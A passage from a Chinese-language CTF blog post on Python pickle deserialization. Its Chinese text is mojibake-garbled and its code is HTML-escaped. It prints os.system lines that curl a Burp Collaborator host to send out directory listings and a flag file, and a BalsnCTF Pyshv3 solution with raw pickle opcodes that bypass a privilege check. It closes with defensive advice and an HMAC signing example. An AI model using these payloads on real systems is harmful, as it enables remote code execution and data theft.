style="color:#8045ff">\x04&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x08\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">categoryq&lt;/span>&lt;span style="color:#8045ff">\x05&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">yq&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">ub.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811195932427.png" alt="image-20210811195932427">&lt;/p>
&lt;h2 id="ä¸€äº›å°æŠ€å·§æ³¨æ„äº‹é¡¹">ä¸€äº›å°æŠ€å·§&amp;amp;æ³¨æ„äº‹é¡¹&lt;/h2>
&lt;ul>
&lt;li>å½“æŠŠpayloadä½œä¸ºgetå‚æ•°è¯·æ±‚æ—¶ï¼Œurlç¼–ç æ³¨æ„æ¢è¡Œç¬¦æ˜¯%0Aè€Œä¸æ˜¯%0D%0A&lt;/li>
&lt;li>å¯¹payloadè¿›è¡Œb64åŠ å¯†æ—¶ï¼Œæ³¨æ„åˆ«æŠŠ\nç»™å•ç‹¬ç¼–ç äº†ï¼ˆä¸è¿‡æ­£å¸¸éƒ½ä¸ä¼šï¼‰&lt;/li>
&lt;li>å…¶ä»–æ¨¡å—çš„loadä¹Ÿå¯ä»¥è§¦å‘pickleååºåˆ—åŒ–æ¼æ´&lt;/li>
&lt;/ul>
&lt;p>ä¾‹å¦‚ï¼š&lt;code>numpy.load()&lt;/code>å…ˆå°è¯•ä»¥numpyè‡ªå·±çš„æ•°æ®æ ¼å¼å¯¼å…¥ï¼Œå¦‚æœå¤±è´¥ï¼Œåˆ™å°è¯•ä»¥pickleçš„æ ¼å¼å¯¼å…¥ï¼›&lt;code>pandas.read_pickle()&lt;/code>ç›´æ¥ä½¿ç”¨&lt;code>pickle.load()&lt;/code>æ–¹æ³•&lt;/p>
&lt;ul>
&lt;li>çµæ´»è¿ç”¨&lt;u>&lt;strong>burp collaborator&lt;/strong>&lt;/u>&lt;/li>
&lt;/ul>
&lt;p>è™½ç„¶æˆ‘ä»¬ä¸èƒ½æŠŠburpæä¾›çš„collaboratorå½“ä½œvpsæ¥ä½¿ç”¨ï¼Œè¿›è¡Œåå¼¹shellç„¶åä¸€é€šæ“ä½œï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå¼•å·+curlçš„æ–¹å¼ç›´æ¥è·å¾—ä»£ç æ‰§è¡Œå’Œç»“æœçš„è¾“å‡ºï¼›curlæœ¬èº«çš„ç”¨æ³•ä¹Ÿå¾ˆå¤šï¼Œå¯ä»¥ç›´æ¥å¸¦æ–‡ä»¶è¿›è¡Œpostï¼Œæ›´å¤šå†…å®¹å‚è§ï¼š&lt;a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl çš„ç”¨æ³•æŒ‡å—&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># åŸºæ“1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl http://xxxx.burpcollaborator.net/`ls / | base64`)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># åŸºæ“2 -då‚æ•°å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶å†…å®¹ä½œä¸ºæ•°æ®ä½“å‘é€ï¼Œä¼šè‡ªåŠ¨æ·»åŠ è¯·æ±‚å¤´å¹¶è°ƒæ•´è¯·æ±‚æ–¹æ³• æ— éœ€-X POST&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl -d &amp;#39;&lt;/span>&lt;span style="color:#f92672">@/&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">txt&lt;/span>&lt;span style="color:#d88200">&amp;#39; http://xxxx.burpcollaborator.net/)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="æœ€åå‡ºäºå®‰å…¨è§’åº¦çš„è€ƒé‡">æœ€åï¼Œå‡ºäºå®‰å…¨è§’åº¦çš„è€ƒé‡&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>ç¦ç”¨pickleï¼Œä½¿ç”¨Jsonæˆ–Google Protocol Buffers&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å½“ç¡®å®éœ€è¦ä½¿ç”¨pickleæ—¶ï¼Œè¦ç¡®ä¿å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œæ¯”å¦‚é‡å†™&lt;code>find_class()&lt;/code>ï¼ˆä½¿ç”¨ç™½åå•è€Œä¸æ˜¯é»‘åå•è¿›è¡Œè¿‡æ»¤ï¼‰ã€ç¦æ­¢æŸäº›æ“ä½œç¬¦ï¼›ç”±äºåœ¨å¯¹opcodeè¿›è¡Œååºåˆ—åŒ–æ—¶å¯èƒ½ä¼šé€ æˆä»»æ„æ–‡ä»¶è¯»å†™ï¼Œä¸€å®šæå‰å¯¹é‡è¦æ–‡ä»¶åšå¥½æƒé™çš„ç®¡ç†ï¼›å¿…è¦æ—¶å¯ä»¥å¯¹ä¿¡æ¯è¿›è¡Œhmacç­¾å&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¸¾ä¸€ä¸ªhmacçš„æ —å­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">hmac&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__str__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;My name is &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">, I am &lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200"> years old.&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">age&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HMAC_Pickler&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">secret_key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">secret_key&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">seperator&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">signer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">hmac&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">signer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">signer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hexdigest&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#111">):]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Data is tampered by someone.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">%s%s%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sign&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SECRET_KEY&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;7f54a0ab-6443-457c-ba20-2510ebbfb28f&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pickler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HMAC_Pickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Jack&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">19&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#34;I am hacker, trying evil things&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­9 - [BalsnCTF 2019] Pyshv3
&lt;/h4>
&lt;/summary>
&lt;p>è¿™æ¬¡çš„find_class()æ²¡æœ‰å˜åŒ–ï¼Œä½†æ˜¯structsæœ‰å…·ä½“çš„å®ç°&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812012841569.png" alt="image-20210812012841569">&lt;/p>
&lt;p>åŒæ—¶server.pyçš„é€»è¾‘ä¹Ÿå‘ç”Ÿäº†å˜åŒ–ï¼Œä¸ç”¨rceäº†ï¼Œç›´æ¥æœ‰ä¸€ä¸ªæ‹¿flagçš„å‡½æ•°ï¼Œä½†éœ€è¦self.user.privilegedä¸ºTrueæ‰å¯ä»¥è¿”å›&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013032487.png" alt="image-20210812013032487">&lt;/p>
&lt;p>è€Œè¿™ä¸ªself.user.privilegedåœ¨ä¸€å¼€å§‹å°±è¢«è®¾ä¸ºäº†False&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013115089.png" alt="image-20210812013115089">&lt;/p>
&lt;p>emmmm è¿™æ€ä¹ˆç»•è¿‡æï¼Ÿ&lt;/p>
&lt;p>å…ˆè¯´éé¢„æœŸï¼Œå°†&lt;code>__builtins__&lt;/code>å¤åˆ¶åˆ°moduleså±æ€§ä¸Šï¼›å†è¯´è¯´é¢„æœŸè§£ã€‚&lt;/p>
&lt;p>æˆ‘ä»¬çŸ¥é“ï¼Œæœ‰&lt;code>__get__&lt;/code>ï¼Œ&lt;code>__set__&lt;/code>è¿™æ ·æè¿°å™¨åè®®æ–¹æ³•çš„å¯¹è±¡ç§°ä¸ºæè¿°å™¨descriptorã€‚é»˜è®¤å¯¹å±æ€§çš„è®¿é—®æ§åˆ¶éƒ½æ˜¯ä»å¯¹è±¡çš„å­—å…¸__dict__é‡Œé¢è¿›è¡Œè·å–(get)ï¼Œè®¾ç½®(set)å’Œåˆ é™¤(delete)çš„æ–¹æ³•ï¼ˆå‰é¢çš„é‚£é“é¢˜ä¹Ÿç”¨åˆ°è¿™ä¸ªç‚¹ï¼‰ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œ&lt;code>a.x&lt;/code>çš„æŸ¥æ‰¾é¡ºåºæ˜¯&lt;code>a.__dict__['x']&lt;/code>ï¼Œä¹‹å&lt;code>type(a).__dict__['x']&lt;/code>ï¼Œç„¶åæ‰¾type(a)çš„çˆ¶ç±»ã€‚å¦‚æœæŸ¥æ‰¾åˆ°çš„å€¼æ˜¯ä¸€ä¸ªæè¿°å™¨ï¼Œpythonå°±ä¼šè°ƒç”¨æè¿°å™¨çš„æ–¹æ³•æ¥é‡å†™é»˜è®¤çš„æ§åˆ¶è¡Œä¸ºï¼Œè¿™ä¸ªé‡å†™å‘ç”Ÿåœ¨è¿™ä¸ªæŸ¥æ‰¾ç¯èŠ‚çš„å“ªé‡Œå–å†³äºå®šä¹‰äº†å“ªä¸ªæè¿°å™¨æ–¹æ³•ã€‚ï¼ˆæ³¨æ„ï¼šåªæœ‰åœ¨æ–°å¼ç±»ä¸­æ—¶æè¿°å™¨æ‰èµ·ä½œç”¨ï¼‰ï¼ˆæ›´å¤šä»‹ç»å‚è§ï¼š&lt;a href="https://foofish.net/what-is-descriptor-in-python.html">ä»€ä¹ˆæ˜¯æè¿°ç¬¦ï¼ˆdescriptorï¼‰&lt;/a>ï¼‰&lt;/p>
&lt;p>æˆ‘ä»¬åˆ©ç”¨æè¿°å™¨çš„ç‰¹æ€§ï¼Œå°†Userç±»çš„&lt;code>__set__&lt;/code>æ–¹æ³•é‡è½½ä¸ºstructs.Userï¼Œå¹¶æŠŠå®ƒçš„privilegedå±æ€§èµ‹å€¼ä¸ºä¸€ä¸ªUserå®ä¾‹ã€‚å½“è¿›è¡Œself.user.privilegedè¢«èµ‹å€¼æ—¶è§¦å‘&lt;code>__set__&lt;/code>ï¼Œä½†ç”±äºå·²ç»è¢«é‡å†™ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šè¢«èµ‹å€¼Falseï¼Œè€Œæ˜¯ä¿æŒåŸæ ·ï¼Œè¿˜æ˜¯ä¸€ä¸ªUserå®ä¾‹ã€‚åœ¨åé¢ifåˆ¤æ–­æ—¶ï¼ŒUserå®ä¾‹å½“ç„¶æ˜¯Trueï¼Œå°±å¯ä»¥ç»•è¿‡äº†ã€‚&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;User&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__set__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;User&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">privileged&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
&lt;pre tabindex="0">&lt;code>b&amp;#34;cstructs\nUser\np0\n0g0\n(}(S&amp;#39;__set__&amp;#39;\ncstructs\nUser\ndtbg0\n(I0\nI0\ntRp2\n0g0\n(}(S&amp;#39;privileged&amp;#39;\ng2\ndtbg2\n.&amp;#34;
&lt;/code>&lt;/pre>&lt;/details>
&lt;p>è€ƒè™‘åˆ°è¿™ä¸ªé¢˜æ›´ç»¼åˆäº†pythonçš„ç›¸å…³ç‰¹æ€§ï¼Œæ‰€ä»¥æŠŠè¿™ä¸ªé¢˜æ”¾åœ¨æœ€åã€‚&lt;/p>
&lt;hr>
&lt;p>ä»æ–°å»ºæ–‡ä»¶åˆ°å†™å®Œç”¨äº†å‡ å¤©æ—¶é—´ï¼Œç»†ç»†åœ°æ•´ç†ç›¸å…³çŸ¥è¯†ï¼Œä¹Ÿç®—æ˜¯å¯¹ååºåˆ—åŒ–è¿™ä¸ªçŸ¥è¯†ç‚¹çš„è®¤è¯†æ¸…æ™°äº†ä¸å°‘ã€‚è¿˜æœ‰ä¸€ä¸ªPyYAMLçš„ååºåˆ—åŒ–é—®é¢˜ï¼Œç”±äºç¯‡å¹…é—®é¢˜æ‹†å¼€æ¥æ”¾åˆ°ä¸‹ä¸€ç¯‡ä¸­ã€‚è‡ªè®¤ä¸ºæ€»ç»“çš„è¿˜æ˜¯æ¯”è¾ƒè¯¦ç»†çš„ï¼ˆå˜¿å˜¿xï¼‰ä¸è¿‡è‚¯å®šè¿˜æœ‰ä¸å‘¨åˆ°çš„åœ°æ–¹ï¼Œä¹‹åå¦‚é‡åˆ°æ›´å¤šçŸ¥è¯†è¿˜ä¼šè¿›è¡Œè¡¥å……ã€‚&lt;/p>
